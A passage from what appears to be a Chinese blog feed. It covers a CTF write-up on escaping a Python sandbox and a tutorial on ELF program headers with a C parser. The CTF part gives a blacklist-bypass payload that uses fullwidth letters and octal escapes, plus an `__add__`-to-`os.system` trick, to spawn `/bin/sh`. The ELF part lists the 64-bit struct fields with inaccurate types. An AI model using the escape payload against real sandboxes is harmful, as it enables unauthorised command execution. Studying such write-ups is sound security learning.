class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Quitter</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, eof)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.eof = eof</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Use %s() or %s to exit'</span> % (self.name, self.eof)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, code=None)</span>:</span></span><br><span class="line">        <span class="comment"># Shells like IDLE catch the SystemExit, but listen when their</span></span><br><span class="line">        <span class="comment"># stdin wrapper is closed.</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sys.stdin.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">raise</span> SystemExit(code)</span><br></pre></td></tr></table></figure><p>Quitter定义没有任何保护,于是我们考虑篡改它的属性。虽然没有<code>__add__</code>，但是我们强行加一个试试。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import os</span><br><span class="line">&gt;&gt;&gt; quit.__class__.__add__=os.system</span><br><span class="line">&gt;&gt;&gt; quit+<span class="string">'/bin/sh'</span></span><br><span class="line">$ ls</span><br><span class="line">Desktop    glibc-all-in-one   PicturesPwngdb   Videos</span><br></pre></td></tr></table></figure><p> 好家伙，我们直接将<code>__add__</code>,篡改为的os.system.</p><h5 id="意外收获"><a href="#意外收获" class="headerlink" title="意外收获"></a>意外收获</h5><p>在看Quitter定义源码时，发现一个有意思的地方：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">'Use %s() or %s to exit'</span> % (self.name, self.eof)</span><br></pre></td></tr></table></figure><p>这和我们直接在python 交换行中输入quit 得到的东西很像。</p><p>查寻手册发现：</p><blockquote><p>object.<strong><strong>repr</strong></strong>(<em>self</em>)<a href="https://docs.python.org/zh-cn/3/reference/datamodel.html?highlight=__add__#object.__repr__" target="_blank" rel="noopener">¶</a></p><p>由 <a href="https://docs.python.org/zh-cn/3/library/functions.html#repr" target="_blank" rel="noopener"><code>repr()</code></a> 内置函数调用以输出一个对象的“官方”字符串表示。如果可能，这应类似一个有效的 Python 表达式，能被用来重建具有相同取值的对象（只要有适当的环境）。如果这不可能，则应返回形式如 <code>&lt;...some useful description...&gt;</code> 的字符串。返回值必须是一个字符串对象。如果一个类定义了 <a href="https://docs.python.org/zh-cn/3/reference/datamodel.html?highlight=__add__#object.__repr__" target="_blank" rel="noopener"><code>__repr__()</code></a> 但未定义 <a href="https://docs.python.org/zh-cn/3/reference/datamodel.html?highlight=__add__#object.__str__" target="_blank" rel="noopener"><code>__str__()</code></a>，则在需要该类的实例的“非正式”字符串表示时也会使用 <a href="https://docs.python.org/zh-cn/3/reference/datamodel.html?highlight=__add__#object.__repr__" target="_blank" rel="noopener"><code>__repr__()</code></a>。</p><p>此方法通常被用于调试，因此确保其表示的内容包含丰富信息且无歧义是很重要的。</p></blockquote><p>原莱我们输入对象名返回的值，如<code>&lt;class &#39;xxx&#39;&gt;</code> 、<code>&lt;built-in function xxxx&gt;</code>是通过调用<code>__repr__</code> 方法即时返回的字符串。</p><p>那么我们只要修改类的<code>__repr__</code> 方法，在输入该类实例变量名是就可以调用我们的方法。但，美中不足的是传参数不好控制。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>在测试中写了一道，算是对那个不求甚解的自己 的 一种记录吧…..(有其他解的大佬，欢迎分享)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string </span><br><span class="line">line = input(<span class="string">'&gt;&gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line">blacklist = string.ascii_letters+<span class="string">"()%&#123;&#125;[]@ "</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> blacklist:</span><br><span class="line">    <span class="keyword">if</span> item <span class="keyword">in</span> line.lower():</span><br><span class="line">        <span class="keyword">raise</span> Exception()</span><br><span class="line"></span><br><span class="line">exec(line)</span><br></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ｑｕｉｔ.__ｃｌａｓｓ__.__ａｄｄ__=__ｉｍｐｏｒｔ__;ｑｕｉｔ.__ｃｌａｓｓ__.__ａｄｄ__=ｑｕｉｔ+<span class="string">'\157\163'</span>;ｑｕｉｔ.__ｃｌａｓｓ__.__ａｄｄ__=ｑｕｉｔ.__ｃｌａｓｓ__.__ａｄｄ__.ｓｙｓｔｅｍ;ｑｕｉｔ+<span class="string">'\57\142\151\156\57\163\150'</span></span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://docs.python.org/zh-cn/3/reference/datamodel.html?highlight=__add__#" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3/reference/datamodel.html?highlight=__add__#</a></p><p><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#command-execution-libraries" target="_blank" rel="noopener">https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#command-execution-libraries</a></p><p><a href="https://github.com/python/cpython/blob/3.11/Lib/site.py" target="_blank" rel="noopener">https://github.com/python/cpython/blob/3.11/Lib/site.py</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELF文件解析--Program header</title>
      <link href="/2023/01/29/ELF%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90--Program%20header/"/>
      <url>/2023/01/29/ELF%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90--Program%20header/</url>
      
        <content type="html"><![CDATA[<p>​    Program header 是ELF文件中存放的是系统加载可执行程序所需要的所有信息，是程序装载必须的一部分。    且Program header 是由一个或多个相同结构的程序段(Segment)组成的。 每个程序段(Segment)用于描述一段硬盘数据和内存数据.<a id="more"></a></p><h2 id="program-header-table"><a href="#program-header-table" class="headerlink" title="program header  table"></a>program header  table</h2><p>多个program header组成了program header table。在program header table 中记录了起始位置、每个表项(program header)的大小、偏移、类型等信息。而program header table 的位置/偏移、数量、大小 信息 被  ELF header中的 <code>e_phoff</code> 、  <code>e_phnum</code>  、<code>e_phentsize</code>这个几个变量所记住。</p><h2 id="program-header"><a href="#program-header" class="headerlink" title="program header"></a>program header</h2><p>在 32位程序下，program header的内容为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word    p_type;        <span class="comment">/* segment type */</span></span><br><span class="line">    Elf32_Off    p_offset;    <span class="comment">/* segment offset */</span></span><br><span class="line">    Elf32_Addr    p_vaddr;    <span class="comment">/* virtual address of segment */</span></span><br><span class="line">    Elf32_Addr    p_paddr;    <span class="comment">/* physical address - ignored? */</span></span><br><span class="line">    Elf32_Word    p_filesz;    <span class="comment">/* number of bytes in file for seg. */</span></span><br><span class="line">    Elf32_Word    p_memsz;    <span class="comment">/* number of bytes in mem. for seg. */</span></span><br><span class="line">    Elf32_Word    p_flags;    <span class="comment">/* flags */</span></span><br><span class="line">    Elf32_Word    p_align;    <span class="comment">/* memory alignment */</span></span><br><span class="line">&#125; Elf32_Phdr;</span><br></pre></td></tr></table></figure><p>在 64位程序下，program header的内容为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Half    p_type;        <span class="comment">/* entry type */</span></span><br><span class="line">    Elf64_Half    p_flags;    <span class="comment">/* flags */</span></span><br><span class="line">    Elf64_Off    p_offset;    <span class="comment">/* offset */</span></span><br><span class="line">    Elf64_Addr    p_vaddr;    <span class="comment">/* virtual address */</span></span><br><span class="line">    Elf64_Addr    p_paddr;    <span class="comment">/* physical address */</span></span><br><span class="line">    Elf64_Xword    p_filesz;    <span class="comment">/* file size */</span></span><br><span class="line">    Elf64_Xword    p_memsz;    <span class="comment">/* memory size */</span></span><br><span class="line">    Elf64_Xword    p_align;    <span class="comment">/* memory &amp; file alignment */</span></span><br><span class="line">&#125; Elf64_Phdr;</span><br></pre></td></tr></table></figure><p>对比可见虽然在x86与x64的program header定义有所差异的，但 结构体的内的 变量的个数与变量名是一样。各种的作用也是相同的：</p><table><thead><tr><th>变量名</th><th>含义</th></tr></thead><tbody><tr><td>p_type</td><td>描述了段的而类型或解释该段的作用</td></tr><tr><td>p_offset</td><td>描述了从文件到该段的文件偏移</td></tr><tr><td>p_vaddr</td><td>描述了段在内存中的偏移</td></tr><tr><td>p_paddr</td><td>描述了物理地址相关，在应用层无作用。</td></tr><tr><td>p_filesz</td><td>p_offset描述了段在文件中的偏移。那么此成员就描述了在文件中所占的大小，可以为0</td></tr><tr><td>p_memsz</td><td>同上，描述了内存中映像所占的字节数。 可以为0</td></tr><tr><td>p_flags</td><td>此成员描述了段的标志,包括读、写、执行</td></tr><tr><td>p_align</td><td>描述了对齐。对于可加载的段 p_vaddr和p_offset取值必须是合适的。此成员给出了段在文件中和内存中如何对齐。数值 0 1 标识不需要对齐。否则就必须是2的倍数。 p_vaddr和p_offset在取模后应该相等。</td></tr></tbody></table><h2 id="代码读取-Program-header"><a href="#代码读取-Program-header" class="headerlink" title="代码读取 Program header"></a>代码读取 Program header</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;elf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">e_ident_read</span><span class="params">(<span class="keyword">char</span> *e_ident)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"头标志:"</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">"%x "</span>,e_ident[i]);&#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n[*]Magic Number:%4s\n"</span>,e_ident);</span><br><span class="line">    <span class="keyword">if</span>(e_ident[<span class="number">4</span>]==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[*]EI_CLASS: x64 (%d)\n"</span>,e_ident[<span class="number">4</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[*]EI_CLASS: x86 (%d)\n"</span>,e_ident[<span class="number">4</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(e_ident[<span class="number">5</span>]==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[*]EI_DATA: big endian (%d)\n"</span>,e_ident[<span class="number">5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[*]EI_DATA: little endian (%d)\n"</span>,e_ident[<span class="number">5</span>]);</span><br><span class="line">    &#125;   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]EI_VERSION: %d\n"</span>,e_ident[<span class="number">6</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*]EI_OSABI: %d\n"</span>,e_ident[<span class="number">7</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">e_type_check</span><span class="params">(<span class="keyword">int</span> e_type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(e_type==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"文件类型: ET_REL\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(e_type==<span class="number">2</span>)</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"文件类型: ET_EXEC\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(e_type==<span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"文件类型: ET_DYN\n"</span>);       </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(e_type==<span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"文件类型: ET_CORE\n"</span>);   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"文件类型: %hx\n"</span>,e_type);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">x64_header_read</span><span class="params">(FILE *fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Elf64_Ehdr elf_header;</span><br><span class="line">    rewind(fp);</span><br><span class="line">    fread(&amp;elf_header,<span class="keyword">sizeof</span>(Elf64_Ehdr),<span class="number">1</span>,fp);</span><br><span class="line">    <span class="keyword">if</span>(elf_header.e_machine==<span class="number">62</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"运行平台: EM_X86_64\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"运行平台: %hx\n"</span>,elf_header.e_machine);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"运行版本:%hx\n"</span>,elf_header.e_version);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"入口虚拟RVA: 0x%lx\n"</span>,elf_header.e_entry);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"程序头文件偏移: 0x%lx\n"</span>,elf_header.e_phoff);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"节头表文件偏移: 0x%lx\n"</span>,elf_header.e_shoff);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ELF文件头大小: 0x%x\n"</span>,elf_header.e_ehsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ELF程序头大小: 0x%x\n"</span>,elf_header.e_phentsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ELF程序头表计数: 0x%x\n"</span>,elf_header.e_phnum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ELF节头表大小: 0x%x\n"</span>,elf_header.e_shentsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ELF节头表计数: 0x%x\n"</span>,elf_header.e_shnum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"字符串表索引节头: 0x%x\n"</span>,elf_header.e_shstrndx);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"程序头(Phdr):\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"段类型\t段偏移\t段虚拟地址\t段物理地址\t段文件大小\t段内存大小\t读写执行\t段的对齐\n"</span>);</span><br><span class="line">    x64_get_phnum(elf_header,fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">x64_get_phnum</span><span class="params">(Elf64_Ehdr elf_header,FILE *fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">int</span> phnum, i,temp;</span><br><span class="line">                <span class="keyword">char</span>* interp ;</span><br><span class="line">                phnum=elf_header.e_phnum;</span><br><span class="line">                Elf64_Phdr *phdr = (Elf64_Phdr*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Elf64_Phdr) * elf_header.e_phnum);</span><br><span class="line">                rewind(fp);</span><br><span class="line">                temp = fseek(fp, elf_header.e_phoff, SEEK_SET);</span><br><span class="line">                temp = fread(phdr, <span class="keyword">sizeof</span>(Elf64_Phdr) * elf_header.e_phnum, <span class="number">1</span>, fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (i  = <span class="number">0</span>; i &lt; phnum; i++) &#123;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">"0x%x\t%d\t0x%x\t0x%x\t%d\t%d\t%d\t0x%x\n"</span>,phdr[i].p_type,phdr[i].p_offset,phdr[i].p_vaddr,phdr[i].p_paddr,phdr[i].p_filesz,phdr[i].p_memsz,phdr[i].p_flags,phdr[i].p_align);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">x32_header_read</span><span class="params">(FILE *fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Elf32_Ehdr elf_header;</span><br><span class="line">    rewind(fp);</span><br><span class="line">    fread(&amp;elf_header,<span class="keyword">sizeof</span>(Elf32_Ehdr),<span class="number">1</span>,fp);</span><br><span class="line"></span><br><span class="line">    e_type_check(elf_header.e_type);</span><br><span class="line">    <span class="keyword">if</span>(elf_header.e_machine==<span class="number">62</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"运行平台: EM_X86_64\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"运行平台: %hx\n"</span>,elf_header.e_machine);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"运行版本:%hx\n"</span>,elf_header.e_version);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"入口虚拟RVA: 0x%x\n"</span>,elf_header.e_entry);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"程序头文件偏移: 0x%x(bytes)\n"</span>,elf_header.e_phoff);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"节头表文件偏移: 0x%x(bytes)\n"</span>,elf_header.e_shoff);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ELF文件头大小: 0x%x\n"</span>,elf_header.e_ehsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ELF程序头大小: 0x%x\n"</span>,elf_header.e_phentsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ELF程序头表数量: 0x%x\n"</span>,elf_header.e_phnum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ELF节头表大小: 0x%x\n"</span>,elf_header.e_shentsize);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ELF节头表数量: 0x%x\n"</span>,elf_header.e_shnum);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"字符串表索引节头: 0x%x\n"</span>,elf_header.e_shstrndx);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"程序头(Phdr):\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"段类型\t段偏移\t段虚拟地址\t段物理地址\t段文件大小\t段内存大小\t读写执行\t段的对齐\n"</span>);</span><br><span class="line">    x32_get_phnum(elf_header,fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">x32_get_phnum</span><span class="params">(Elf32_Ehdr elf_header,FILE *fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">int</span> phnum, i,temp;</span><br><span class="line">                <span class="keyword">char</span>* interp ;</span><br><span class="line">                phnum=elf_header.e_phnum;</span><br><span class="line">                Elf32_Phdr *phdr = (Elf32_Phdr*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Elf32_Phdr) * elf_header.e_phnum);</span><br><span class="line">                rewind(fp);</span><br><span class="line">                temp = fseek(fp, elf_header.e_phoff, SEEK_SET);</span><br><span class="line">                temp = fread(phdr, <span class="keyword">sizeof</span>(Elf32_Phdr) * elf_header.e_phnum, <span class="number">1</span>, fp);</span><br><span class="line">                rewind(fp);</span><br><span class="line">               <span class="comment">/// fseek(fp, phdr[elf_header.e_phnum].ph_size, SEEK_SET);</span></span><br><span class="line"><span class="comment">//                 typedef struct elf32_phdr&#123;</span></span><br><span class="line"><span class="comment">//   Elf32_Word    p_type;  //段的类型，LOAD，DYNAMIC等</span></span><br><span class="line"><span class="comment">//   Elf32_Off    p_offset;  //段在文件中的偏移量</span></span><br><span class="line"><span class="comment">//   Elf32_Addr    p_vaddr;  //段的虚拟地址</span></span><br><span class="line"><span class="comment">//   Elf32_Addr    p_paddr;  //段的物理地址</span></span><br><span class="line"><span class="comment">//   Elf32_Word    p_filesz;  //段在文件中的大小</span></span><br><span class="line"><span class="comment">//   Elf32_Word    p_memsz;  //段在内存中的大小</span></span><br><span class="line"><span class="comment">//   Elf32_Word    p_flags;  //读写执行标记</span></span><br><span class="line"><span class="comment">//   Elf32_Word    p_align;  //段的对齐</span></span><br><span class="line"><span class="comment">// &#125; Elf32_Phdr;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (i  = <span class="number">0</span>; i &lt; phnum; i++) &#123;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">"0x%x\t%d\t0x%x\t0x%x\t%d\t%d\t%d\t0x%x\n"</span>,phdr[i].p_type,phdr[i].p_offset,phdr[i].p_vaddr,phdr[i].p_paddr,phdr[i].p_filesz,phdr[i].p_memsz,phdr[i].p_flags,phdr[i].p_align);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">void</span>  <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"> 